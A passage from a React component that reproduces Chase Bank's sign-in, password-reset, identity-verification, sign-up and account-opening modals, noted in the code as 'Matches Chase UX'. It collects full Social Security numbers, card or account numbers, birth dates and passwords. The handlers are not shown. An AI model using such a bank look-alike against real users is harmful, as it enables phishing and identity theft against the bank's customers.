                    Resend Code
                  </button>
                </>
              )}
            </div>
          )}

          {/* Forgot Password Form */}
          {modalView === "forgot-password" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Reset Password</h2>
              <p className="text-gray-600 mb-6">Verify your identity to reset your password.</p>

              {!showVerification ? (
                <>
                  <div className="space-y-4 mb-6">
                    <p className="text-sm font-medium text-gray-700">Choose verification method:</p>
                    <div className="grid grid-cols-3 gap-2">
                      {(["email", "phone", "ssn"] as const).map((method) => (
                        <button
                          key={method}
                          onClick={() => setRecoveryMethod(method)}
                          className={`p-3 rounded-lg border-2 transition-all ${
                            recoveryMethod === method
                              ? "border-[#117aca] bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          {method === "email" && <Mail className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "phone" && <Phone className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "ssn" && <Shield className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          <span className="text-xs capitalize">{method === "ssn" ? "SSN" : method}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {recoveryMethod === "email" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                      <input
                        type="email"
                        value={recoveryEmail}
                        onChange={(e) => setRecoveryEmail(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered email"
                      />
                    </div>
                  )}

                  {recoveryMethod === "phone" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                      <input
                        type="tel"
                        value={recoveryPhone}
                        onChange={(e) => setRecoveryPhone(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered phone"
                      />
                    </div>
                  )}

                  {recoveryMethod === "ssn" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Last 4 digits of SSN</label>
                      <input
                        type="password"
                        maxLength={4}
                        value={recoverySSN}
                        onChange={(e) => setRecoverySSN(e.target.value.replace(/\D/g, ""))}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="****"
                      />
                    </div>
                  )}

                  <Button
                    onClick={handleForgotSubmit}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Sending..." : "Send Verification Code"}
                  </Button>
                </>
              ) : (
                <>
                  <div className="mb-4">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
                    <input
                      type="text"
                      maxLength={6}
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent text-center text-2xl tracking-widest"
                      placeholder="000000"
                    />
                  </div>

                  <div className="mb-4">
                    <label className="block text-sm font-medium text-gray-700 mb-2">New Password</label>
                    <input
                      type="password"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                      placeholder="Enter new password"
                    />
                  </div>

                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Confirm New Password</label>
                    <input
                      type="password"
                      value={confirmNewPassword}
                      onChange={(e) => setConfirmNewPassword(e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                      placeholder="Confirm new password"
                    />
                  </div>

                  <div className="mb-6 p-3 bg-gray-50 rounded-lg">
                    <p className="text-xs text-gray-600 mb-2">Password requirements:</p>
                    <ul className="text-xs text-gray-500 space-y-1">
                      <li className={newPassword.length >= 8 ? "text-green-600" : ""}>
                        {newPassword.length >= 8 ? "✓" : "○"} At least 8 characters
                      </li>
                      <li className={/[A-Z]/.test(newPassword) ? "text-green-600" : ""}>
                        {/[A-Z]/.test(newPassword) ? "✓" : "○"} One uppercase letter
                      </li>
                      <li className={/[a-z]/.test(newPassword) ? "text-green-600" : ""}>
                        {/[a-z]/.test(newPassword) ? "✓" : "○"} One lowercase letter
                      </li>
                      <li className={/\d/.test(newPassword) ? "text-green-600" : ""}>
                        {/\d/.test(newPassword) ? "✓" : "○"} One number
                      </li>
                    </ul>
                  </div>

                  <Button
                    onClick={handleVerifyCode}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Resetting..." : "Reset Password"}
                  </Button>
                </>
              )}
            </div>
          )}

          {/* Identity Verification Modal - Matches Chase UX */}
          {modalView === "identify" && (
            <div className="p-6">
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Identification</h2>
              <p className="text-gray-700 mb-6 font-semibold">Let's confirm your identity</p>

              <p className="text-sm text-gray-600 mb-8">
                To protect your account, we need to confirm it's you. Please provide the requested info. If you have more
                than one account, choose one and we'll take care of the rest. Commercial clients must enter a Tax ID
                number.
              </p>

              <div className="space-y-6">
                {/* SSN / TIN Field */}
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Social Security number or Tax ID (TIN)</label>
                  <div className="relative">
                    <input
                      type={showSSN ? "text" : "password"}
                      value={identitySSN}
                      onChange={(e) => {
                        const cleaned = e.target.value.replace(/\D/g, "").slice(0, 9)
                        setIdentitySSN(cleaned)
                      }}
                      className="w-full border-b-2 border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-400"
                      placeholder="000-00-0000 or Tax ID"
                      maxLength={9}
                    />
                    <button
                      type="button"
                      onClick={() => setShowSSN(!showSSN)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 text-[#117aca] hover:text-[#0a5a9e] font-semibold text-sm"
                    >
                      {showSSN ? "Hide" : "Show"}
                    </button>
                  </div>
                  <div className="text-right text-xs text-gray-500 mt-2">
                    {9 - identitySSN.length} of 9 characters remaining.
                  </div>
                  <button
                    type="button"
                    onClick={() => setModalView("identify-no-ssn")}
                    className="text-[#117aca] hover:underline text-sm mt-2 inline-flex items-center gap-1"
                  >
                    Don't have a Social Security number?
                    <ExternalLink className="w-3 h-3" />
                  </button>
                </div>

                {/* Account/Card Number Field */}
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Account, card or application number</label>
                  <div className="relative">
                    <input
                      type={showAccountNumber ? "text" : "password"}
                      value={identityAccountNumber}
                      onChange={(e) => {
                        const cleaned = e.target.value.replace(/\D/g, "").slice(0, 16)
                        setIdentityAccountNumber(cleaned)
                      }}
                      className="w-full border-b-2 border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-400"
                      placeholder="Enter your account or card number"
                      maxLength={16}
                    />
                    <button
                      type="button"
                      onClick={() => setShowAccountNumber(!showAccountNumber)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 text-[#117aca] hover:text-[#0a5a9e] font-semibold text-sm"
                    >
                      {showAccountNumber ? "Hide" : "Show"}
                    </button>
                  </div>
                  <button
                    type="button"
                    onClick={() => setModalView("identify-authorized")}
                    className="text-[#117aca] hover:underline text-sm mt-3 inline-flex items-center gap-1"
                  >
                    I'm an authorized user on someone else's account
                    <ExternalLink className="w-3 h-3" />
                  </button>
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-red-600 mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              )}

              {/* Footer Links */}
              <a
                href="/faq"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[#117aca] hover:underline text-sm mt-6 inline-flex items-center gap-1"
              >
                Questions? Read our FAQs
                <ExternalLink className="w-3 h-3" />
              </a>

              {/* Continue Button */}
              <Button
                onClick={handleIdentityVerification}
                disabled={isLoading || (!identitySSN.trim() && !identityAccountNumber.trim())}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-8 text-base font-semibold"
              >
                {isLoading ? "Verifying..." : "Continue"}
              </Button>
            </div>
          )}

          {/* Alternative ID Modal - For users without SSN */}
          {modalView === "identify-no-ssn" && (
            <div className="p-6">
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Don't have a Social Security number?</h2>
              <p className="text-gray-700 mb-6 font-semibold">No problem - we have alternative options</p>

              <p className="text-sm text-gray-600 mb-8">
                If you don't have a Social Security number, you can verify your identity using other acceptable forms of identification.
              </p>

              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Type of Identification</label>
                  <select
                    value={altIdType}
                    onChange={(e) => setAltIdType(e.target.value as "passport" | "license" | "itin")}
                    className="w-full border-2 border-gray-300 rounded-lg py-3 px-4 focus:outline-none focus:border-[#117aca] transition-colors"
                  >
                    <option value="">Select identification type</option>
                    <option value="passport">Passport</option>
                    <option value="license">Driver's License</option>
                    <option value="itin">ITIN (Individual Taxpayer ID Number)</option>
                  </select>
                </div>

                {altIdType && (
                  <div>
                    <label className="text-sm font-medium text-gray-700 mb-3 block">Country/State</label>
                    <input
                      type="text"
                      value={altIdCountry}
                      onChange={(e) => setAltIdCountry(e.target.value)}
                      placeholder="e.g., US, Canada, Mexico"
                      className="w-full border-2 border-gray-300 rounded-lg py-3 px-4 focus:outline-none focus:border-[#117aca] transition-colors"
                    />
                  </div>
                )}

                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Identification Number</label>
                  <div className="relative">
                    <input
                      type={showAltId ? "text" : "password"}
                      value={altIdNumber}
                      onChange={(e) => setAltIdNumber(e.target.value.replace(/\D/g, "").slice(0, 20))}
                      className="w-full border-b-2 border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-400"
                      placeholder="Enter your identification number"
                    />
                    <button
                      type="button"
                      onClick={() => setShowAltId(!showAltId)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 text-[#117aca] hover:text-[#0a5a9e] font-semibold text-sm"
                    >
                      {showAltId ? "Hide" : "Show"}
                    </button>
                  </div>
                </div>
              </div>

              {error && (
                <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-red-600 mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              )}

              <Button
                onClick={handleAlternativeIdentification}
                disabled={isLoading || !altIdType || !altIdNumber.trim()}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-8 text-base font-semibold"
              >
                {isLoading ? "Verifying..." : "Verify Identity"}
              </Button>
            </div>
          )}

          {/* Authorized User Modal */}
          {modalView === "identify-authorized" && (
            <div className="p-6">
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Authorized User Access</h2>
              <p className="text-gray-700 mb-6 font-semibold">Verify your authorized user status</p>

              <p className="text-sm text-gray-600 mb-8">
                To verify access to an account you're authorized to use, please provide information about the primary account holder.
              </p>

              <div className="space-y-6">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Your Name</label>
                  <input
                    type="text"
                    value={authorizedUserName}
                    onChange={(e) => setAuthorizedUserName(e.target.value)}
                    className="w-full border-b-2 border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent"
                    placeholder="First and Last Name"
                  />
                </div>

                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Primary Account Holder Name</label>
                  <input
                    type="text"
                    value={accountHolder}
                    onChange={(e) => setAccountHolder(e.target.value)}
                    className="w-full border-b-2 border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent"
                    placeholder="Account owner's first and last name"
                  />
                </div>

                <div>
                  <label className="text-sm font-medium text-gray-700 mb-3 block">Your Relationship to Account Holder</label>
                  <select
                    value={accountHolderRelation}
                    onChange={(e) => setAccountHolderRelation(e.target.value)}
                    className="w-full border-2 border-gray-300 rounded-lg py-3 px-4 focus:outline-none focus:border-[#117aca] transition-colors"
                  >
                    <option value="">Select relationship</option>
                    <option value="spouse">Spouse</option>
                    <option value="parent">Parent</option>
                    <option value="child">Child</option>
                    <option value="sibling">Sibling</option>
                    <option value="other">Other Family Member</option>
                    <option value="assistant">Personal Assistant</option>
                  </select>
                </div>
              </div>

              {error && (
                <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-red-600 mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              )}

              <Button
                onClick={handleAuthorizedUserVerification}
                disabled={isLoading || !authorizedUserName.trim() || !accountHolder.trim() || !accountHolderRelation.trim()}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-8 text-base font-semibold"
              >
                {isLoading ? "Verifying..." : "Continue"}
              </Button>
            </div>
          )}

          {/* Sign Up Modal */}
          {modalView === "signup" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Sign up for Chase Online</h2>
              <p className="text-gray-600 mb-6">Access your accounts anytime, anywhere.</p>

              <div className="space-y-4">
                <button
                  onClick={() => setModalView("signup-form")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <CreditCard className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left flex-1">
                    <p className="font-semibold text-gray-900">I have a Chase account</p>
                    <p className="text-sm text-gray-500">Sign up for online access to your existing account</p>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("open-account")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                    <Building2 className="w-6 h-6 text-green-600" />
                  </div>
                  <div className="text-left flex-1">
                    <p className="font-semibold text-gray-900">I'm new to Chase</p>
                    <p className="text-sm text-gray-500">Open a new Chase account today</p>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-blue-50 rounded-xl">
                <h3 className="font-semibold text-gray-900 mb-2">Benefits of Chase Online</h3>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> 24/7 account access
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Free bill pay
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Mobile check deposit
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Real-time alerts
                  </li>
                </ul>
              </div>
            </div>
          )}

          {/* Sign Up Form */}
          {modalView === "signup-form" && (
            <div className="p-6">
              <div className="flex items-center gap-2 mb-4">
                {[1, 2, 3].map((step) => (
                  <div key={step} className="flex items-center">
                    <div
                      className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                        signupStep >= step ? "bg-[#117aca] text-white" : "bg-gray-200 text-gray-500"
                      }`}
                    >
                      {signupStep > step ? <Check className="w-4 h-4" /> : step}
                    </div>
                    {step < 3 && <div className={`w-8 h-1 ${signupStep > step ? "bg-[#117aca]" : "bg-gray-200"}`} />}
                  </div>
                ))}
              </div>

              {signupStep === 1 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Personal Information</h2>
                  <div className="space-y-4">
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">First Name *</label>
                        <input
                          type="text"
                          value={signupData.firstName}
                          onChange={(e) => setSignupData({ ...signupData, firstName: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Last Name *</label>
                        <input
                          type="text"
                          value={signupData.lastName}
                          onChange={(e) => setSignupData({ ...signupData, lastName: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Email Address *</label>
                      <input
                        type="email"
                        value={signupData.email}
                        onChange={(e) => setSignupData({ ...signupData, email: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number *</label>
                      <input
                        type="tel"
                        value={signupData.phone}
                        onChange={(e) => setSignupData({ ...signupData, phone: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                  </div>
                </>
              )}

              {signupStep === 2 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Identity Verification</h2>
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Social Security Number *</label>
                      <input
                        type="password"
                        value={signupData.ssn}
                        onChange={(e) => setSignupData({ ...signupData, ssn: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        placeholder="***-**-****"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth *</label>
                      <input
                        type="date"
                        value={signupData.dob}
                        onChange={(e) => setSignupData({ ...signupData, dob: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Street Address *</label>
                      <input
                        type="text"
                        value={signupData.address}
                        onChange={(e) => setSignupData({ ...signupData, address: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
                        <input
                          type="text"
                          value={signupData.city}
                          onChange={(e) => setSignupData({ ...signupData, city: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">State</label>
                        <input
                          type="text"
                          value={signupData.state}
                          onChange={(e) => setSignupData({ ...signupData, state: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                    </div>
                  </div>
                </>
              )}

              {signupStep === 3 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Create Credentials</h2>
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Username *</label>
                      <input
                        type="text"
                        value={signupData.username}
                        onChange={(e) => setSignupData({ ...signupData, username: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Password *</label>
                      <input
                        type="password"
                        value={signupData.password}
                        onChange={(e) => setSignupData({ ...signupData, password: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                      <div className="mt-2 p-2 bg-gray-50 rounded text-xs">
                        <ul className="space-y-1">
                          <li className={signupData.password.length >= 8 ? "text-green-600" : "text-gray-500"}>
                            {signupData.password.length >= 8 ? "✓" : "○"} At least 8 characters
                          </li>
                          <li className={/[A-Z]/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/[A-Z]/.test(signupData.password) ? "✓" : "○"} One uppercase letter
                          </li>
                          <li className={/[a-z]/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/[a-z]/.test(signupData.password) ? "✓" : "○"} One lowercase letter
                          </li>
                          <li className={/\d/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/\d/.test(signupData.password) ? "✓" : "○"} One number
                          </li>
                        </ul>
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Confirm Password *</label>
                      <input
                        type="password"
                        value={signupData.confirmPassword}
                        onChange={(e) => setSignupData({ ...signupData, confirmPassword: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                      {signupData.confirmPassword && signupData.password !== signupData.confirmPassword && (
                        <p className="text-red-500 text-xs mt-1">Passwords do not match</p>
                      )}
                    </div>
                    <div className="space-y-3 pt-2">
                      <label className="flex items-start gap-3 cursor-pointer">
                        <Checkbox
                          checked={signupData.agreeTerms}
                          onCheckedChange={(checked) =>
                            setSignupData({ ...signupData, agreeTerms: checked as boolean })
                          }
                          className="mt-0.5"
                        />
                        <span className="text-sm text-gray-600">
                          I agree to the{" "}
                          <a href="#" className="text-[#117aca] hover:underline">
                            Terms of Service
                          </a>{" "}
                          and{" "}
                          <a href="#" className="text-[#117aca] hover:underline">
                            Privacy Policy
                          </a>
                        </span>
                      </label>
                      <label className="flex items-start gap-3 cursor-pointer">
                        <Checkbox
                          checked={signupData.agreeElectronic}
                          onCheckedChange={(checked) =>
                            setSignupData({ ...signupData, agreeElectronic: checked as boolean })
                          }
                          className="mt-0.5"
                        />
                        <span className="text-sm text-gray-600">
                          I agree to receive electronic communications from Chase
                        </span>
                      </label>
                    </div>
                  </div>
                </>
              )}

              <Button
                onClick={handleSignupSubmit}
                disabled={isLoading}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-6"
              >
                {isLoading ? "Processing..." : signupStep === 3 ? "Create Account" : "Continue"}
              </Button>
            </div>
          )}

          {/* Open Account Modal */}
          {modalView === "open-account" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Open a Chase Account</h2>
              <p className="text-gray-600 mb-6">Choose the account that's right for you.</p>

              <div className="space-y-3">
                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                      <Building2 className="w-6 h-6 text-[#117aca]" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Checking Account</p>
                      <p className="text-sm text-gray-500">Chase Total Checking - $0 deposit to open</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                      <Shield className="w-6 h-6 text-green-600" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Savings Account</p>
                      <p className="text-sm text-gray-500">Chase Savings - Earn interest on your balance</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                      <CreditCard className="w-6 h-6 text-[#117aca]" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Credit Card</p>
                      <p className="text-sm text-gray-500">Chase Freedom, Sapphire, and more</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/investments", "_blank")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center">
                      <ExternalLink className="w-6 h-6 text-orange-600" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Investment Account</p>
                      <p className="text-sm text-gray-500">Self-Directed Investing & more</p>
                    </div>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                <p className="text-xs text-gray-600">
                  <strong>Need help choosing?</strong> Call us at 1-800-935-9935 or visit a Chase branch near you.
                </p>
              </div>
            </div>
          )}

          {/* Account Type Details */}
          {modalView === "account-type" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">Chase Total Checking</h2>

              <div className="bg-gradient-to-r from-[#117aca] to-[#0a5a9e] text-white p-6 rounded-xl mb-6">
                <p className="text-3xl font-bold">$300</p>
                <p className="text-sm opacity-90">New account bonus when you set up direct deposit</p>
              </div>

              <div className="space-y-4 mb-6">
                <h3 className="font-semibold text-gray-900">Account Benefits</h3>
                <ul className="space-y-3">
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Access to 15,000+ Chase ATMs and 4,700+ branches</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Chase Mobile app with mobile check deposit</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">
                      Zero Liability Protection on unauthorized transactions
                    </span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Send money with Zelle</span>
                  </li>
                </ul>
              </div>

              <div className="p-4 bg-yellow-50 border border-yellow-200 rounded-xl mb-6">
                <div className="flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Monthly Service Fee</p>
                    <p className="text-xs text-gray-600">
                      $12/month. Easily waived with direct deposit of $500+ or $1,500+ daily balance.
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={() => setModalView("open-account-form")}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
              >
                Open Account in App
              </Button>

              <p className="text-xs text-center text-gray-500 mt-4">
                Quick 2-minute account opening process. No external sites required.
              </p>
            </div>
          )}

          {/* Account Opening Form - New In-App Form */}
          {modalView === "open-account-form" && (
            <div className="p-6">
              <button
                onClick={() => setModalView("account-type")}
                className="mb-4 text-[#117aca] hover:underline text-sm font-medium flex items-center gap-1"
              >
                ← Back
              </button>
              <h2 className="text-xl font-bold text-gray-900 mb-6">Complete Your Account Opening</h2>

              <div className="space-y-4">
                {/* Account Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
                  <input
                    type="text"
                    placeholder="e.g., My Checking"
                    value={accountName}
                    onChange={(e) => setAccountName(e.target.value)}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#117aca] focus:ring-1 focus:ring-[#117aca]"
                  />
                </div>

                {/* Initial Deposit */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Initial Deposit (Optional)</label>
                  <div className="relative">
                    <span className="absolute left-4 top-2 text-gray-500 font-medium">$</span>
                    <input
                      type="number"
                      placeholder="0.00"
                      min="0"
                      step="0.01"
                      value={initialDeposit}
                      onChange={(e) => setInitialDeposit(e.target.value)}
                      className="w-full pl-8 pr-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#117aca] focus:ring-1 focus:ring-[#117aca]"
                    />
                  </div>
                  <p className="text-xs text-gray-500 mt-1">Minimum deposit is $0. You can add funds anytime.</p>
                </div>

                {/* Funding Source */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Funding Source</label>
                  <select
                    value={fundingSource}
                    onChange={(e) => setFundingSource(e.target.value)}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-[#117aca] focus:ring-1 focus:ring-[#117aca]"
                  >
                    <option value="existing-account">Existing Chase Account</option>
                    <option value="debit-card">Debit Card</option>
                    <option value="wire-transfer">Wire Transfer</option>
                    <option value="none">No Initial Deposit</option>
                  </select>
                </div>

                {/* Terms Checkbox */}
                <div className="flex items-start gap-3 p-4 bg-blue-50 rounded-lg">
                  <input
                    type="checkbox"
                    checked={agreeToTerms}
                    onChange={(e) => setAgreeToTerms(e.target.checked)}
                    className="mt-1 w-4 h-4 text-[#117aca] rounded focus:ring-[#117aca]"
                  />
                  <label className="text-xs text-gray-600">
                    I agree to the Chase Bank Terms of Service and understand that this account will be opened immediately upon confirmation. Funds will be available in real-time.
                  </label>
                </div>
              </div>

              {/* Submit Button */}
              <Button
                onClick={handleOpenAccount}
                disabled={!agreeToTerms || !accountName.trim() || isOpeningAccount}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-6"
              >
                {isOpeningAccount ? "Opening Account..." : "Open Account Instantly"}
              </Button>

              {accountOpenError && (
                <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600">{accountOpenError}</p>
                </div>
              )}
            </div>
          )}

          {/* Privacy Modal */}
          {modalView === "privacy" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">Privacy & Security</h2>

              <div className="space-y-4">
                <button
